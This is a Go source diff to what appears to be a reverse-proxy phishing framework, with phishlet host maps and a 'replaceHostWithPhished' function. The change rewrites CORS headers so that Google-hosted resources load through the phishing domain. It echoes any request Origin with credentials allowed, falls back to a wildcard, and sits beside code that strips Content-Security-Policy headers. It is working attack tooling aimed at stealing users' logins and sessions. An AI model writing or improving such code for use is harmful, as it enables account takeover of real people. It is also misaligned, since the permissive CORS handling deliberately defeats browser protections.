@@ -998,14 +998,31 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
+				replaced := false
 				if u, err := url.Parse(allow_origin); err == nil {
 					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
+						// Host is in the phishlet proxy map — rewrite to phishing domain.
 						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+						replaced = true
 					}
 				} else {
 					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
 				}
+				if !replaced {
+					// Host is NOT in the proxy map (e.g. play.google.com, gstatic.com,
+					// googleapis.com). Echo back the request's Origin so the browser
+					// always sees a matching value instead of the unmapped original domain.
+					req_origin := resp.Request.Header.Get("Origin")
+					if req_origin != "" {
+						resp.Header.Set("Access-Control-Allow-Origin", req_origin)
+					} else {
+						// No Origin header on request — allow everything as a safe fallback.
+						resp.Header.Set("Access-Control-Allow-Origin", "*")
+					}
+				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
+				resp.Header.Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
+				resp.Header.Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
 			} else if allow_origin == "" {
 				// Add CORS headers if missing - needed for gstatic.com and other CDNs
 				origin := resp.Request.Header.Get("Origin")
@@ -1025,6 +1042,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					resp.Header.Set("Access-Control-Allow-Headers", "*")
 				}
 			}
+
 			var rm_headers = []string{
 				"Content-Security-Policy",
 				"Content-Security-Policy-Report-Only",
